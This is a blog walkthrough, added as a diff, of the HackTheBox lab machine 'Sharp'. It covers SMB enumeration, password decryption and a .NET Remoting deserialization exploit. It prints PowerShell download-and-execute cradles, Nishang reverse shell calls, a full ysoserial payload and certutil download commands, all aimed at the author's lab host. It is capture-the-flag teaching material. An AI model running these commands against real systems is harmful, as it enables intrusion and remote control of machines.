@@ -1,0 +1,264 @@
+---
+layout: walkthrough
+title: HackTheBox - Sharp
+date: 2021-05-02 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/sharp.png # Add image post (optional)
+status: Retired
+description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Sharp --`10.10.10.219`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Sharp/Overview.png"  style="width: 50%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox$ nmap -sC -sV 10.10.10.219 -Pn
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.                   
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-19 06:40 EDT                                                   
+Nmap scan report for 10.10.10.219                                                                                 
+Host is up (0.18s latency).                                                                                       
+Not shown: 996 filtered ports                                                                                     
+PORT     STATE SERVICE            VERSION                                                                         
+135/tcp  open  msrpc              Microsoft Windows RPC                                                           
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn                                                   
+445/tcp  open  microsoft-ds?                                                                                      
+8888/tcp open  storagecraft-image StorageCraft Image Manager                                                      
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                          
+                                                                                                                  
+Host script results:                                                                                              
+|_clock-skew: 10m14s                                                                                              
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-03-19T10:52:11
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 115.48 seconds
+
+```
+
+</details>
+
+From the output shown above, we can see that the machine is a Windows machine and I added `sharp.htb` to the `/etc/hosts` file. As this is a Windows machine and it only has a few open ports, I started with port 8888. Unfortunately, the web application didn't resolve, but I did look into StorageCraft and found the following: <https://support.storagecraft.com/s/article/imagemanager-overview?language=en_US>.
+
+> StorageCraft ImageManager  helps you maintain and manage backup image files and the storage space  used by those files. Based on a policy that you create, ImageManager  automatically consolidates incremental backup image files into daily,  weekly, and monthly incremental images.
+
+### SMB Enumeration and Password Decryption
+
+As I didn't have a way to interact with the application, I decided to switch tactics and try and exploit SMB. I started off by determining whether I would be able to interact with the host anonymously:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Sharp/img1.png"  style="width: 70%" />
+</p>
+
+Success! I found that I was able to read the Kanban directory. I copied all of the files off and found a `User Guide` as well as a `PortableKanban.pk3` file within the directory. The file contained JSON with 2 user fields which included an encrypted password. I found an exploit which I used to decrypt the passwords for the users: <https://www.exploit-db.com/exploits/49409>.
+
+```bash
+vagrant@ko:~/Desktop/HackTheBox/Sharp$ python3 Decrypt.py SMB/PortableKanban.pk3.bak 
+Administrator:G2@$btRSHJYTarg
+lars:G123HHrth234gRG
+```
+
+An alternative method would have been to open the `.bak` file in the Portable Kanban executable and simply viewed the user's passwords through the `Show Passwords` button.Using SMBMap, I attempted to authenticate using the credentials and I found that the credentials for `lars` were valid on the host:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Sharp/img2.png"  style="width: 70%" />
+</p>
+
+The `dev` share contained a few files, including a `notes.txt` file -- the content of which is provided below:
+
+```text
+Todo:
+    Migrate from .Net remoting to WCF
+    Add input validation
+```
+
+Alright, I now knew that the code on the dev share was important to this part of the challenge. I copied them to my host and used <https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v5.0-rc2> to decompile the various EXEs. When looking into the `Server.exe` file, I found the `StartServer` function which included:
+
+<details>
+
+```c#
+private static void StartServer()
+{
+	//IL_002b: Unknown result type (might be due to invalid IL or missing references)
+	//IL_0031: Expected O, but got Unknown
+	//IL_0038: Unknown result type (might be due to invalid IL or missing references)
+	//IL_0043: Expected O, but got Unknown
+	//IL_003e: Unknown result type (might be due to invalid IL or missing references)
+	//IL_0049: Expected O, but got Unknown
+	Hashtable obj = new Hashtable
+	{
+		[(object)"port"] = 8888,
+		[(object)"rejectRemoteRequests"] = false
+	};
+	BinaryServerFormatterSinkProvider val = (BinaryServerFormatterSinkProvider)(object)new BinaryServerFormatterSinkProvider();
+	val.set_TypeFilterLevel(TypeFilterLevel.Full);
+	ChannelServices.RegisterChannel((IChannel)(object)new TcpChannel((IDictionary)obj, (IClientChannelSinkProvider)(object)new BinaryClientFormatterSinkProvider(), (IServerChannelSinkProvider)(object)val), true);
+	RemotingConfiguration.set_CustomErrorsMode((CustomErrorsModes)1);
+	RemotingConfiguration.RegisterWellKnownServiceType(typeof(Remoting), "SecretSharpDebugApplicationEndpoint", (WellKnownObjectMode)1);
+	Console.WriteLine("Registered service");
+	while (true)
+	{
+		Console.ReadLine();
+	}
+}
+```
+</details>
+
+It referred to port 8888 which is the open port as well as a secret endpoint, so this seems to be the correct train of thought. I continued looking through the decompiled code and came across the `main` function for the `Client.exe` executable:
+<details>
+
+```c#
+private static void Main(string[] args)
+{
+	//IL_0000: Unknown result type (might be due to invalid IL or missing references)
+	//IL_000b: Expected O, but got Unknown
+	ChannelServices.RegisterChannel((IChannel)(object)new TcpChannel(), true);
+	IDictionary channelSinkProperties = ChannelServices.GetChannelSinkProperties((object)(Remoting)Activator.GetObject(typeof(Remoting), "tcp://localhost:8888/SecretSharpDebugApplicationEndpoint"));
+	channelSinkProperties["username"] = "debug";
+	channelSinkProperties["password"] = "SharpApplicationDebugUserPassword123!";
+}
+```
+</details>
+
+### Exploiting .NET Remoting
+
+As shown above, it contained a hardcoded username/password combination. I needed to find a way to be able to exploit .NET remoting. I found the following GitHub project and decided to give it a try: <https://github.com/tyranid/ExploitRemotingService>. Looking at the README, I needed to construct a exploit with the following parameters:
+
+```bat
+ExploitRemotingService.exe -s --ver=4 --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw <COMMAND>
+```
+
+At this point I needed to determine which command I would need to use to exploit this. I decided that since it's .NET remoting, it's most likely a deserialization exploit which would require ysoserial.
+
+> ysoserial.net is a collection of utilities and property-oriented programming "gadget chains" discovered in common .NET libraries that can, under the right conditions, exploit .NET applications performing unsafe deserialization of objects.
+
+In order to create the payload, I needed to determine the Gadget type and saw that the `TypeConfuseDelegate` gadgets included formatters for Net Serialize, so I started constructing the payload below which would pull the main PowerShell reverse shell from my Kali host:
+
+```powershell
+powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.73:8000/Invoke-PowerShellTcp.ps1')
+```
+
+In addition, I needed to ensure that the Nishang reverse shell would return to my machine, so I added a function call to the bottom of the PowerShell script:
+
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.73 -Port 9001
+```
+
+Using the payload above, I created a base64 version of the command and used the following ysoserial command which I would then insert into the `ExploitRemotingService.exe` command line parameter:
+
+```bat
+ysoserial.exe -f BinaryFormatter -o raw -g TypeConfuseDelegate -c "powershell -e cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgAEkARQBYACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA3ADYAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==')" 
+```
+
+The output is provided below:
+
+<details>
+
+```bash
+AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAHEvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNzY6ODAwMC9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL
+```
+
+</details>
+
+After running the exploit with the raw ysoserial command above, I successfully received a connection back from the host:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Sharp/img3.png"  style="width: 70%" />
+</p>
+
+## Privilege Escalation using Lars
+
+Within the User's Documents directory, there was a WCF folder which, if you recall, was what the remoting service was meant to be ported over to. I compressed the folder and transferred it to my host with the following commands:
+
+```powershell
+Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip
+move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev
+```
+
+I then browsed to the share with file explorer and retrieved the zip file. Opening this folder up, the main `Program.cs` file contained the connection strings to port 8889 where the WCF Endpoint was running for both the Client and the Server:
+
+<details>
+
+```c#
+namespace Client {
+
+    public class Client
+    {
+        public static void Main() {
+            ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(
+                new NetTcpBinding(SecurityMode.Transport),"net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint"
+            );
+            IWcfService client = channelFactory.CreateChannel();
+            Console.WriteLine(client.GetDiskInfo());
+            Console.WriteLine(client.GetCpuInfo());
+            Console.WriteLine(client.GetRamInfo());
+        }
+    }
+```
+```c#
+ protected override void OnStart(string[] args)
+        {
+
+            if (serviceHost != null)
+            {
+                serviceHost.Close();
+            }
+
+            Uri baseAddress = new Uri("net.tcp://0.0.0.0:8889/wcf/NewSecretWcfEndpoint");
+            serviceHost = new ServiceHost(typeof(Remoting), baseAddress);
+            NetTcpBinding binding = new NetTcpBinding();
+            binding.Security.Mode = SecurityMode.Transport;
+            binding.Security.Transport.ClientCredentialType = TcpClientCredentialType.Windows;
+            binding.Security.Transport.ProtectionLevel      = ProtectionLevel.EncryptAndSign;
+            binding.Security.Message.ClientCredentialType   = MessageCredentialType.Windows;
+
+            try
+            {
+                serviceHost.AddServiceEndpoint(typeof(IWcfService), binding, baseAddress);
+                serviceHost.Open();
+            }
+            catch (CommunicationException ce)
+            {
+                serviceHost.Abort();
+            }
+
+        }
+```
+
+</details>
+
+Since I had access to the source code, I performed the following steps to exploit the software:
+
+* Added in a line for a reverse shell within the `Client` Software:
+    * `Console.WriteLine(client.InvokePowerShell(IEX(new-object net.webclient).downloadstring('http://10.10.14.73:8000/Invoke-PowerShellTcp2.ps1')));`
+* Recompiled the exploit
+* Uploaded it back to the server
+* Ran wcf
+
+In order to upload the file to the server, I made use of the following certutil commands:
+
+```
+certutil -urlcache -split -f "http://10.10.14.47:8000/WcfRemotingLibrary.dll" WcfRemotingLibrary.dll 
+certutil -urlcache -split -f "http://10.10.14.47:8000/WcfClient.exe" WcfClient.exe
+```
+
+Once the new files were back on the server, I ran the client and received a reverse shell back from the host:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Sharp/img4.png"  style="width: 100%" />
+</p>
+
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
